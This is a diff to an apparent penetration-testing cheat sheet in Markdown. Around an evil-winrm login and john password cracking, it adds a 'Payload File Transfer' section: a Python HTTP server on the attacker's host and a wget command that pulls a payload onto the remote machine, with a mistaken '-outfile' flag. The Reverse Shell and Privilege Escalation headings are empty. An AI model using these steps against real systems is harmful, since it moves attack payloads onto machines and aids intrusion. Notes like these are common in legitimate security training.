@@ -269,19 +269,6 @@ evil-winrm -i {IP ADDRESS} -u {USERNAME} -p {PASSWORD}
 
 <br />
 
-
-# Reverse Shell
-
-## Linux
-
-## Windows
-
-# Privilege Escalation
-
-## Linux
-
-## Windows
-
 # Password Cracking
 
 ***
@@ -308,4 +295,52 @@ john -w=/usr/share/wordlists/rockyou.txt {file.txt}
 ```
 
 <br />
+
+# Payload File Transfer
+
+...
+
+## 1) Python Server
+
+<br />
+
+**USAGE**
+
+<br />
+
+```bash
+# Host a personal server on a specific port
+sudo python3 -m http.server {PORT}
+```
+## 2) WGET 
+
+<br />
+
+**USAGE**
+
+<br />
+
+```bash
+# Download files on the remote machine
+wget http://{IP ADDRESS}/{FILE} -outfile {FILE}
+
+# {IP ADDRESS}: Python Server IP Address
+# {FILE}: The payload to be trasnfered
+```
+<br />
+
+# Privilege Escalation
+
+## Linux
+
+## Windows
+
+
+# Reverse Shell
+
+## Linux
+
+## Windows
+
+
 
